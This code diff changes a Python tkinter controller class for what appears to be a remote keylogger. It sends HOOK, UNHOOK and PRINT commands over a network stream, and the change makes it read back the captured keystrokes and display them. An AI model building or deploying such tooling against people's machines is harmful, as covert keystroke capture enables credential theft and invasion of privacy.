@@ -7,21 +7,27 @@ class Key(KeylogApp):
         self.nw = nw
         self.nr = nr
         self.ns = ns
+        self.data = ""
 
     def send_hook(self):
         s = "HOOK"
         self.nw.write(s + "\n")
+        self.nw.flush()
 
     def send_unhook(self):
         s = "UNHOOK"
         self.nw.write(s + "\n")
+        self.nw.flush()
 
     def send_print(self):
         s = "PRINT"
         self.nw.write(s + "\n")
-        # data = self.nr.read(5000)
-        # s = data.decode()
-        # self.txtKQ.insert(tk.END, s)
+        self.nw.flush()
+        data = self.nr.readline().strip()
+        self.data = data + self.data[len(data):]
+        self.txtKQ.config(state='normal')
+        self.txtKQ.insert("end", self.data)
+        self.txtKQ.config(state='disabled')
 
     def on_closing(self):
         s = "QUIT"
